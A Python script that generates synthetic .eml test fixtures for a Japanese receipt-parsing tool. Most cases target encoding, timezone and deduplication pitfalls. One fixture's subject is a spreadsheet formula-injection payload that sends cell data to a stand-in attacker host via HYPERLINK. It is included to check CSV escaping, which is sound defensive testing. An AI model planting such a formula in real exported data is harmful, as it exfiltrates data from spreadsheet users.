"""照合用の .eml を生成する。

実データは使わない。差出人・金額・IDはすべて架空のものを組み立てている。
狙いは「それらしいメール」ではなく、**過去に壊れた箇所を狙って踏ませる入力**を作ること。

なぜ手書きの .eml をリポジトリに置かず生成するのか:
  - ISO-2022-JP のエスケープ列や base64 は、テキストエディタで書くと壊れる
  - どのバイトが何を狙っているのかが、生成コードにしか書けない
  - 読む側が中身を変えて試せる

生成:
    python3 compare/make_fixtures.py
"""

from __future__ import annotations

import base64
import quopri
from pathlib import Path

OUT = Path(__file__).parent / "fixtures"


def crlf(text: str) -> bytes:
    """ヘッダは CRLF で組む(RFC 5322)。本文の改行は各 fixture の意図に任せる。"""
    return text.replace("\n", "\r\n").encode("ascii")


# ---------------------------------------------------------------- 01
def iso2022jp_escape() -> bytes:
    """7bit の ISO-2022-JP を復号せずに扱うと $ が通貨記号に化ける。

    ISO-2022-JP の2バイト文字は、そのままバイト列として読むと ASCII に見える。
    ひらがなは第1バイトが 0x24、つまり '$' である。
    「す」は 0x24 0x39 なので、バイト列では "$9" と読める。
    その直後に第1バイトが 0x30('0')〜0x39('9') の漢字が来ると、"$90" が出来上がる。

    金額抽出は「通貨記号のあとに数字」を拾うので、復号せずに正規表現を当てると
    これをドル建て金額として読む。正しく復号すれば、ただの日本語として通り過ぎる。

    復号できている実装  : JPY 1780(「合計 1,780円」を読む)
    復号していない実装  : USD 90   (「合計」がバイト列のままなので読めず、"$90" を拾う)

    狙って作ってはいるが、必要なのは「ひらがなの直後に特定の区の漢字が来る」だけで、
    日本語の平文なら普通に起こりうる並びである。
    """
    trap = bytes([0x30, 0x24])  # 第1バイトが '0' の漢字。直前の「す」の "$9" と繋がる
    body = (
        b"\x1b$B"
        + "ご利用ありがとうございます".encode("iso-2022-jp")[3:-3]
        + trap
        + b"\x1b(B\n"
        + "合計 1,780円\n".encode("iso-2022-jp")
        + b"\n"
    )
    head = crlf(
        "From: DMM <info@mail.dmm.example>\n"
        "To: user@example.com\n"
        "Subject: =?ISO-2022-JP?B?"
        + base64.b64encode("ご購入明細".encode("iso-2022-jp")).decode()
        + "?=\n"
        "Date: Tue, 13 Jan 2026 12:34:56 +0900\n"
        "Message-ID: <fixture-01@example.invalid>\n"
        "Content-Type: text/plain; charset=ISO-2022-JP\n"
        "Content-Transfer-Encoding: 7bit\n"
        "\n"
    )
    return head + body


# ---------------------------------------------------------------- 02
def html_entity_amount() -> bytes:
    """実体参照を解決しないと、通貨記号を見失って別の数字を拾う。

    最初は「&yen;12,000 JPY」で書いていたが、これは**解決しなくても通ってしまう**。
    ラベルと数字の間の実体参照を読み飛ばしても、12,000 と JPY が残るためである。
    prove.py に欠陥を戻させて初めて、このフィクスチャが何も検査していないと分かった。

    通貨記号そのものを実体参照にすると、解決の有無が結果を変える。

        解決する   : 「合計 $43.00」  → USD 43
        解決しない : 「合計 &#36;43.00」→ 通貨記号が無いので "36" を金額として拾う
    """
    html = (
        "<html><body><table>"
        "<tr><td>合計</td><td>&#36;43.00</td></tr>"
        "<tr><td>お支払い方法</td><td>クレジットカード</td></tr>"
        "</table></body></html>\n"
    )
    head = crlf(
        "From: Example Store <billing@store.example>\n"
        "To: user@example.com\n"
        "Subject: =?UTF-8?B?" + base64.b64encode("ご購入の領収書".encode()).decode() + "?=\n"
        "Date: Wed, 14 Jan 2026 10:00:00 +0900\n"
        "Message-ID: <fixture-02@example.invalid>\n"
        "Content-Type: text/html; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
    )
    return head + html.encode("utf-8")


# ---------------------------------------------------------------- 03
def mime_word_split() -> bytes:
    """RFC 2047 の分割語。encoded-word が続くとき、間の空白は捨てる。

    「ご購入」「明細のお知らせ」を2つの encoded-word に割る。
    折り返しの空白を残すと「ご購入 明細のお知らせ」になり、
    捨てると「ご購入明細のお知らせ」になる。件名は請求元判定にも使われるので、
    ここが実装ごとに違うと結果が静かにずれる。
    """
    w1 = base64.b64encode("ご購入".encode()).decode()
    w2 = base64.b64encode("明細のお知らせ".encode()).decode()
    head = crlf(
        "From: Example Store <billing@store.example>\n"
        "To: user@example.com\n"
        f"Subject: =?UTF-8?B?{w1}?=\n =?UTF-8?B?{w2}?=\n"
        "Date: Thu, 15 Jan 2026 11:00:00 +0900\n"
        "Message-ID: <fixture-03@example.invalid>\n"
        "Content-Type: text/plain; charset=UTF-8\n"
        "\n"
    )
    return head + "お支払金額 ¥2,400\n".encode("utf-8")


# ---------------------------------------------------------------- 04
def proxy_merchant() -> bytes:
    """決済代行を挟むと、送信元は請求元ではない。

    送信元だけを見る実装はこれを「PayPal」に潰す。
    本文の「マーチャント」欄を読めば、実際の請求先が出る。
    """
    body = (
        "取引が完了しました\n"
        "\n"
        "取引ID XXXXXXXXXXXXXXXXX\n"
        "マーチャント EXAMPLE GAMES PTE. LTD...\n"
        "説明 単価 数量 金額\n"
        "星の砂 1000個 ¥1,220 JPY 1 ¥1,220 JPY\n"
        "合計 ¥1,220 JPY\n"
    )
    head = crlf(
        "From: service-jp@paypal.example\n"
        "To: user@example.com\n"
        "Subject: =?UTF-8?B?" + base64.b64encode("お支払いの領収書".encode()).decode() + "?=\n"
        "Date: Fri, 16 Jan 2026 20:15:00 +0900\n"
        "Message-ID: <fixture-04@example.invalid>\n"
        "Content-Type: text/plain; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
    )
    return head + body.encode("utf-8")


# ---------------------------------------------------------------- 05
def base64_utf8() -> bytes:
    """base64 + UTF-8。復号経路が違っても結果は同じになるはず、という確認。"""
    body = base64.b64encode("お買い上げ明細\n合計金額 ¥3,240\n".encode("utf-8"))
    wrapped = b"\r\n".join(body[i : i + 76] for i in range(0, len(body), 76)) + b"\r\n"
    head = crlf(
        "From: Example Mart <receipt@mart.example>\n"
        "To: user@example.com\n"
        "Subject: =?UTF-8?B?" + base64.b64encode("ご注文の明細".encode()).decode() + "?=\n"
        "Date: Sat, 17 Jan 2026 09:05:00 +0900\n"
        "Message-ID: <fixture-05@example.invalid>\n"
        "Content-Type: text/plain; charset=UTF-8\n"
        "Content-Transfer-Encoding: base64\n"
        "\n"
    )
    return head + wrapped


# ---------------------------------------------------------------- 06
def qp_iso2022jp() -> bytes:
    """quoted-printable + ISO-2022-JP。復号を2段通す経路。"""
    raw = "ご利用明細\n決済金額 5,980円\n".encode("iso-2022-jp")
    body = quopri.encodestring(raw)
    head = crlf(
        "From: Example Net <info@net.example>\n"
        "To: user@example.com\n"
        "Subject: =?ISO-2022-JP?B?"
        + base64.b64encode("ご利用明細".encode("iso-2022-jp")).decode()
        + "?=\n"
        "Date: Sun, 18 Jan 2026 22:40:00 +0900\n"
        "Message-ID: <fixture-06@example.invalid>\n"
        "Content-Type: text/plain; charset=ISO-2022-JP\n"
        "Content-Transfer-Encoding: quoted-printable\n"
        "\n"
    )
    return head + body


# ---------------------------------------------------------------- 07
def nested_multipart() -> bytes:
    """multipart/mixed > multipart/alternative + 添付。

    text/plain を選べているか。html を先に拾うと金額が別の行から取れてしまう。
    添付(application/pdf)を本文と誤認しないかも同時に見る。
    """
    plain = "領収書\n合計 ¥8,800\n"
    html = "<html><body><p>合計 &yen;9,999</p></body></html>"  # わざと違う金額
    pdf = base64.b64encode(b"%PDF-1.4 dummy").decode()
    body = (
        "--MIXED\n"
        "Content-Type: multipart/alternative; boundary=\"ALT\"\n"
        "\n"
        "--ALT\n"
        "Content-Type: text/plain; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
        f"{plain}\n"
        "--ALT\n"
        "Content-Type: text/html; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
        f"{html}\n"
        "--ALT--\n"
        "--MIXED\n"
        "Content-Type: application/pdf; name=\"receipt.pdf\"\n"
        "Content-Transfer-Encoding: base64\n"
        "\n"
        f"{pdf}\n"
        "--MIXED--\n"
    )
    head = crlf(
        "From: Example Shop <order@shop.example>\n"
        "To: user@example.com\n"
        "Subject: =?UTF-8?B?" + base64.b64encode("ご注文ありがとうございます".encode()).decode() + "?=\n"
        "Date: Mon, 19 Jan 2026 13:20:00 +0900\n"
        "Message-ID: <fixture-07@example.invalid>\n"
        "Content-Type: multipart/mixed; boundary=\"MIXED\"\n"
        "\n"
    )
    return head + body.replace("\n", "\r\n").encode("utf-8")


# ---------------------------------------------------------------- 08
def timezone_boundary() -> bytes:
    """日付が UTC 換算で前日になる時刻。

    +0900 の 08:30 は UTC では前日 23:30 になる。
    両実装とも「読む人の暦」で日付にするので、日本で開けば 01-15 になる。
    UTC に寄せる実装は 01-14 になり、ここで差が出る。
    """
    head = crlf(
        "From: Example Store <billing@store.example>\n"
        "To: user@example.com\n"
        "Subject: =?UTF-8?B?" + base64.b64encode("早朝のご購入".encode()).decode() + "?=\n"
        "Date: Thu, 15 Jan 2026 08:30:00 +0900\n"
        "Message-ID: <fixture-08@example.invalid>\n"
        "Content-Type: text/plain; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
    )
    return head + "合計 ¥1,100\n".encode("utf-8")


# ---------------------------------------------------------------- 09
def html_cell_boundary() -> bytes:
    """タグを空白に置き換えず削除すると、隣のセルの数字と連結する。

    表組みの領収書で、金額の直前のセルが数字で終わっていると事故になる。

        空白に置換 : 「1,234 5,600円」 → 5,600 を拾う
        削除       : 「1,2345,600円」  → 12,345,600 を拾う

    ラベル（合計・ご請求金額など）を置いていないのは、ラベルがあると
    そちらから読めてしまい、この欠陥を踏まなくなるため。
    """
    html = (
        "<html><body><table>"
        "<tr><th>ポイント</th><th>金額</th></tr>"
        "<tr><td>1,234</td><td>5,600円</td></tr>"
        "</table></body></html>\n"
    )
    head = crlf(
        "From: Example Mart <receipt@mart.example>\n"
        "To: user@example.com\n"
        "Subject: =?UTF-8?B?" + base64.b64encode("お買い上げ明細".encode()).decode() + "?=\n"
        "Date: Tue, 20 Jan 2026 15:00:00 +0900\n"
        "Message-ID: <fixture-09@example.invalid>\n"
        "Content-Type: text/html; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
    )
    return head + html.encode("utf-8")


# ---------------------------------------------------------------- 10
def foreign_offset_boundary() -> bytes:
    """海外のオフセットで届き、手元の暦では翌日になる時刻。

    08 の裏返し。08 は「UTC に寄せると前日に落ちる」形だが、こちらは
    **書かれたオフセットのまま日付にすると前日に落ちる**形である。

        -0700 の 7/15 10:43  =  UTC 7/15 17:43  =  JST 7/16 02:43

    実際に踏んだ。この時刻に届いた PayPal の領収書6通(計 ¥3,780)が、
    `--since 2026-07-16` で「期間より前」と判定されて落ちていた。
    落ちても例外は出ず、合計が小さくなるだけなので気づきにくい。

    どちらの解釈を採るかは実装の選択だが、2つの実装で食い違えば
    ブラウザ版と CLI 版で違う数字が出る。
    """
    head = crlf(
        "From: service@paypal.co.jp\n"
        "To: user@example.com\n"
        "Subject: =?UTF-8?B?" + base64.b64encode("ご請求内容".encode()).decode() + "?=\n"
        "Date: Wed, 15 Jul 2026 10:43:00 -0700\n"
        "Message-ID: <fixture-10@example.invalid>\n"
        "Content-Type: text/plain; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
    )
    return head + "合計 ¥630\n".encode("utf-8")


# ---------------------------------------------------------------- 11
def formula_subject() -> bytes:
    """件名が数式に見える領収書。

    件名は送りつける側が完全に自由に決められる。CSV に素通しすると
    表計算ソフトが開いた瞬間に数式として実行するので、両実装とも
    先頭に ' を付けて文字列に落とさなければならない。

    ここが割れたのは実際に起きたことで、2026-07-26 に summary 側だけ
    対策を入れ、detail 側は掛け忘れていた。ブラウザ版は全セルを通す
    関所になっていて漏れていなかったため、**同じ道具の中で実装が
    割れていた**。出力層が照合対象の外にあったので気づけなかった。
    """
    head = crlf(
        "From: Example Store <billing@store.example>\n"
        "To: user@example.com\n"
        "Subject: =?UTF-8?B?" + base64.b64encode(
            '=HYPERLINK("http://attacker.example/?d="&A1,"click")'.encode()
        ).decode() + "?=\n"
        "Date: Wed, 15 Jul 2026 10:43:00 +0900\n"
        "Message-ID: <fixture-11@example.invalid>\n"
        "Content-Type: text/plain; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
    )
    return head + "合計 ¥630\n".encode("utf-8")

def not_paid_context() -> bytes:
    """金額の形をしているが払っていない数字が、本物より前に並んでいる領収書。

    実データで誤検出した4つの形を1通に詰めてある。どれも「もっともらしい金額」
    として通り、例外は出ない。**合計が静かに膨らむ**ので、
    両実装が同じ順序で同じものを飛ばすことを確かめないと気づけない。

      3,000円相当        当選賞品の価値
      3,980円(税込)以上  送料無料のしきい値
      新料金：¥2,500     値上げの予告。まだ払っていない
      合計で星玉×2,550   ゲーム内通貨の個数

    正解は最後の「合計 ¥1,220」。1つでも飛ばし損ねると、そこで打ち切って
    別の数字を返すので、どちらの実装が緩いかが金額に出る。

    脚注のしきい値より**後ろ**に本物を置いているのが要点で、最初の一致で
    打ち切る実装だと本物に到達できない。
    """
    head = crlf(
        "From: Example Store <billing@store.example>\n"
        "To: user@example.com\n"
        "Subject: =?UTF-8?B?" + base64.b64encode("ご購入ありがとうございます".encode()).decode() + "?=\n"
        "Date: Wed, 15 Jul 2026 10:43:00 +0900\n"
        "Message-ID: <fixture-12@example.invalid>\n"
        "Content-Type: text/plain; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
    )
    body = (
        "抽選でAmazonギフトカード（※）3,000円相当が当たる\n"
        "※1　3,980円(税込)以上ご購入で送料無料となります。\n"
        "新料金：¥2,500 — 旧料金：¥1,980\n"
        "バージョンイベントに参加すると、合計で星玉×2,550を獲得できます\n"
        "合計 ¥1,220\n"
    )
    return head + body.encode("utf-8")


def _order_mail(ident: str, subject: str, day: int) -> bytes:
    """同じ相手・同じ金額で、件名と日付だけ違うメール。"""
    head = crlf(
        "From: Example Mart <auto-confirm@mart.example>\n"
        "To: user@example.com\n"
        "Subject: =?UTF-8?B?" + base64.b64encode(subject.encode()).decode() + "?=\n"
        f"Date: Wed, {day} Jul 2026 10:43:00 +0900\n"
        f"Message-ID: <fixture-{ident}@example.invalid>\n"
        "Content-Type: text/plain; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
    )
    return head + "合計 ¥2,520\n".encode("utf-8")


def order_placed() -> bytes:
    """1つの注文の前半。次の fixture と対で意味を持つ。

    「注文済み」と「発送済み」は同じ買い物の別々の段階なので、
    足すと実額の2倍になる。Message-ID も本文も違うので、
    通知の同一性では寄せられない。
    """
    return _order_mail("13", "注文済み:「コンタクトレンズ」とその他1", 15)


def order_shipped() -> bytes:
    """1つの注文の後半。前の fixture と寄って1件になる。"""
    return _order_mail("14", "発送済み:「コンタクトレンズ」とその他1", 16)


def repeat_purchase_a() -> bytes:
    """同じ額を同じ日に2回払った、別々の取引。**寄せてはいけないほう。**

    件名が同じで届くのは、1件ごとに1通出す定型の相手である。
    実データでは同じ日に同じ相手から ¥610 の領収書が3通来ていた。
    課金の単位が決まっている相手ほどこの形になるので、
    金額と日付だけで寄せる実装はここで必ず落ちる。
    """
    return _order_mail("15", "ご注文ありがとうございます", 20)


def repeat_purchase_b() -> bytes:
    """上と件名も金額も同じ、別の取引。寄せずに2件のまま残らなければならない。"""
    return _order_mail("16", "ご注文ありがとうございます", 20)


# ---------------------------------------------------------------- 17
def ad_product_price() -> bytes:
    """広告メール。載っているのは製品の値段で、払った額ではない。

    金額の文脈(3,000円相当・送料無料など)は1つも当たらない。
    「¥599,800」は裸で置かれていて、支払われた額と字面が区別できないため、
    **数字を見ている限り正しく通ってしまう**。落とせるのは
    「このメールが取引か」を見る層だけで、判断材料は件名にしかない。

    フッタに「購入履歴」があるのが要点。本文全体で取引の語を探す実装だと、
    ここに救われて広告が通る。実データではこの形が最大の誤検出で、
    1通で ¥599,800 が支出に立っていた。
    """
    head = crlf(
        "From: Apple <no_reply@email.apple.com>\n"
        "To: user@example.com\n"
        "Subject: =?UTF-8?B?" + base64.b64encode("新しいヘッドセット、登場。".encode()).decode() + "?=\n"
        "Date: Thu, 16 Oct 2025 10:00:00 +0900\n"
        "Message-ID: <fixture-17@example.invalid>\n"
        "Content-Type: text/plain; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
    )
    body = (
        "新しいヘッドセット ¥599,800（税込）から\n"
        "Apple Account ・ 購入履歴 ・ 販売条件 ・ プライバシーポリシー\n"
    )
    return head + body.encode("utf-8")


# ---------------------------------------------------------------- 18
def card_statement() -> bytes:
    """カード会社の請求額通知。件名に「支払」が入るので語では落とせない。

    中身は個々の取引ではなく1か月の合計なので、明細と一緒に数えると二重になる。
    発行元でしか落とせないことを、両実装で同じに保つための1件。
    法人格つきの表記(「◯◯カード株式会社」)で来るのが要点で、
    完全一致で持っている実装はここを素通りする。
    """
    head = crlf(
        "From: =?UTF-8?B?" + base64.b64encode("楽天カード株式会社".encode()).decode() + "?= <info@mail.rakuten-card.example>\n"
        "To: user@example.com\n"
        "Subject: =?UTF-8?B?" + base64.b64encode("お支払い金額のご案内".encode()).decode() + "?=\n"
        "Date: Fri, 10 Oct 2025 10:00:00 +0900\n"
        "Message-ID: <fixture-18@example.invalid>\n"
        "Content-Type: text/plain; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
    )
    body = "楽天カード株式会社\nご請求金額 47,618 円\n"
    return head + body.encode("utf-8")


# ---------------------------------------------------------------- 19
def bare_subject_receipt() -> bytes:
    """件名が請求元の名前だけの領収書。**落としてはいけない側**。

    非取引の判定を件名だけで行うと、これが消える。落ちても例外は出ず、
    合計が静かに小さくなるので、弾く側のテストより先にこちらが要る。
    本文で金額が「合計」として立っていることを根拠に残す。
    """
    head = crlf(
        "From: service@paypal.co.jp\n"
        "To: user@example.com\n"
        "Subject: PayPal\n"
        "Date: Sat, 11 Oct 2025 10:00:00 +0900\n"
        "Message-ID: <fixture-19@example.invalid>\n"
        "Content-Type: text/plain; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
    )
    body = "マーチャント EXAMPLE STORE\n合計 ¥630 JPY\n"
    return head + body.encode("utf-8")



# ---------------------------------------------------------------- 20
def processor_notice() -> bytes:
    """決済代行の定期支払い通知。本文に「マーチャント」欄が無い。

    PayPal の領収書は本文の「マーチャント」欄から実際の請求先を読むが、
    この形式にはその欄が無く、請求元が「PayPal」のまま残る。
    同じ支払いを加盟店側も別途知らせてくるので(21番)、寄せないと1回の
    支払いが2件になる。請求元が違うので通常の重複判定では寄らない。
    """
    head = crlf(
        "From: service-jp@paypal.example\n"
        "To: user@example.com\n"
        "Subject: =?UTF-8?B?" + base64.b64encode("Example Playerへの自動支払いを行いました".encode()).decode() + "?=\n"
        "Date: Tue, 16 Sep 2025 10:00:00 +0900\n"
        "Message-ID: <fixture-20@example.invalid>\n"
        "Content-Type: text/plain; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
    )
    body = "Example Playerにお支払いいただきありがとうございます\n取引ID 0GB518125J611015L\n支払金額\n$72.00 USD\n"
    return head + body.encode("utf-8")


# ---------------------------------------------------------------- 21
def merchant_side_receipt() -> bytes:
    """20番と同じ支払いを、加盟店側が別に知らせてくる領収書。

    件名から進み具合は読めない(「自動支払いを行いました」と
    "Subscription Confirmation")ので、_PROGRESS_SUBJECT では寄らない。
    **残すのはこちら**。「PayPal $72.00」より請求先が分かるぶん後から使える。
    """
    head = crlf(
        "From: Example Player <noreply@player.example>\n"
        "To: user@example.com\n"
        "Subject: Example Player - Subscription Confirmation\n"
        "Date: Tue, 16 Sep 2025 12:00:00 +0900\n"
        "Message-ID: <fixture-21@example.invalid>\n"
        "Content-Type: text/plain; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
    )
    body = "Thank you for subscribing!\n- Plan Type: Annual\n- Amount Charged: $72.00\n"
    return head + body.encode("utf-8")


# ---------------------------------------------------------------- 22
def plan_rate_not_charge() -> bytes:
    """カート放棄を促す広告。載っているのはプランの料率で、払った額ではない。

    件名に "Purchase" が入るので「取引を示す語」の判定は通る。
    落とせるのは金額の文脈の側で、「USD 19.99/year」の "/year" が根拠になる。
    実データでは 2 通あり、どちらも支払いは発生していなかった。
    """
    head = crlf(
        "From: Example365 <noreply@infomail.example>\n"
        "To: user@example.com\n"
        "Subject: Action Required: Finish Your Example 365 Purchase\n"
        "Date: Tue, 30 Jan 2024 10:00:00 +0900\n"
        "Message-ID: <fixture-22@example.invalid>\n"
        "Content-Type: text/plain; charset=UTF-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "\n"
    )
    body = "Complete your purchase\nView your cart and confirm your order details\nEXAMPLE 365 BASIC\nUSD 19.99/year\n"
    return head + body.encode("utf-8")



FIXTURES = {
    "01-iso2022jp-escape.eml": iso2022jp_escape,
    "02-html-entity-amount.eml": html_entity_amount,
    "03-mime-word-split.eml": mime_word_split,
    "04-proxy-merchant.eml": proxy_merchant,
    "05-base64-utf8.eml": base64_utf8,
    "06-qp-iso2022jp.eml": qp_iso2022jp,
    "07-nested-multipart.eml": nested_multipart,
    "08-timezone-boundary.eml": timezone_boundary,
    "09-html-cell-boundary.eml": html_cell_boundary,
    "10-foreign-offset-boundary.eml": foreign_offset_boundary,
    "11-formula-subject.eml": formula_subject,
    "12-not-paid-context.eml": not_paid_context,
    "13-order-placed.eml": order_placed,
    "14-order-shipped.eml": order_shipped,
    "15-repeat-purchase-a.eml": repeat_purchase_a,
    "16-repeat-purchase-b.eml": repeat_purchase_b,
    "17-ad-product-price.eml": ad_product_price,
    "18-card-statement.eml": card_statement,
    "19-bare-subject-receipt.eml": bare_subject_receipt,
    "20-processor-notice.eml": processor_notice,
    "21-merchant-side-receipt.eml": merchant_side_receipt,
    "22-plan-rate-not-charge.eml": plan_rate_not_charge,
}


def main() -> None:
    OUT.mkdir(exist_ok=True)
    for name, build in FIXTURES.items():
        (OUT / name).write_bytes(build())
        print(f"生成: fixtures/{name}")


if __name__ == "__main__":
    main()
